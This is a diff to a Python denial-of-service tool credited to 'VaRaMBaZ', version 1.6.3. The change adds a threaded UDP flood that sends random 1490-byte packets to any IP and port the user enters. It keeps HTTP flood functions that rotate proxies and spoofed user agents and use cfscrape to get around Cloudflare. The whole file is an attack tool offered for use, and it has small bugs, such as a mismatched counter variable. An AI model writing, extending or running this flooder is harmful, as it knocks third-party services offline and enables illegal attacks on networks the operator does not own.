@@ -3,6 +3,14 @@ import threading
 import random
 import requests
 import cfscrape
+import socket
+import os
+
+os.system("clear")
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
 s = cfscrape.create_scraper()
 
@@ -15,7 +23,7 @@ with open('proxyhttp') as file:
 with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 
-def dos1(target):
+def dosweb1(target):
     while True:
         useragent = random.choice(headersp)
         header = {'user-agent': useragent}
@@ -43,7 +51,7 @@ def dos1(target):
             print(colorama.Fore.RED + "[-] Connection error!")
 
 
-def dos2(target):
+def dosweb2(target):
     while True:
         useragent = random.choice(headersp)
         header = {'user-agent': useragent}
@@ -53,8 +61,20 @@ def dos2(target):
         except requests.exceptions.ConnectionError:
             print(colorama.Fore.RED + "[-] Connection error!")
 
+def ddosip(ip):
+    global send
+    while True:
+        sock.sendto(bytes, (ip, port))
+        send = send + 1
+        print("[" + send + "]" + " Pocket sent")
+
+
+def aa(num):
+    while True:
+        sock.sendto(bytes, (ip, port))
 
 threads = 20
+
 print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
 print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
 print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
@@ -62,34 +82,52 @@ print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-
 print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
 print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
 print("Creator: VaRaMBaZ")
-print("Version: 1.6.2: TEST PUBLIC PROXY \n")
+print("Version: 1.6.3: TEST IP DDOS \n")
 
+vibor = int(input("Attack for IP or Web [1-IP; 2-Web]: "))
 
-url = input("URL: ")
+if (vibor == 1):
+    sent = 0
+    ip = input("IP Target: ")
+    port = int(input("Port: "))
 
-try:
-    threads = int(input("Threads: "))
-except ValueError:
-    exit("Threads count is incorrect!")
+    try:
+        threads = int(input("Threads: "))
+    except ValueError:
+        exit("Threads count is incorrect!")
 
-proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
-
-if threads == 0:
-    exit("Threads count is incorrect!")
-
-if not url.__contains__("http"):
-    exit("URL doesnt contains http or https!")
-
-if not url.__contains__("."):
-    exit("Invalid domain")
-
-if (proxyuseage == 1):
     for i in range(0, threads):
-        thr = threading.Thread(target=dos1, args=(url,))
-        thr.start()
+        ipddos = threading.Thread(target=aa, args=(1,))
+        ipddos.start()
         print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
 else:
-    for i in range(0, threads):
-        thr2 = threading.Thread(target=dos2, args=(url,))
-        thr2.start()
-        print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
+    url = input("URL: ")
+
+    try:
+        threads = int(input("Threads: "))
+    except ValueError:
+        exit("Threads count is incorrect!")
+
+    if threads == 0:
+        exit("Threads count is incorrect!")
+
+    if not url.__contains__("http"):
+        exit("URL doesnt contains http or https!")
+
+    if not url.__contains__("."):
+        exit("Invalid domain")
+
+
+
+    proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
+
+    if (proxyuseage == 1):
+        for i in range(0, threads):
+            thr = threading.Thread(target=dosweb1, args=(url,))
+            thr.start()
+            print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
+    else:
+        for i in range(0, threads):
+            thr2 = threading.Thread(target=dosweb2, args=(url,))
+            thr2.start()
+            print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
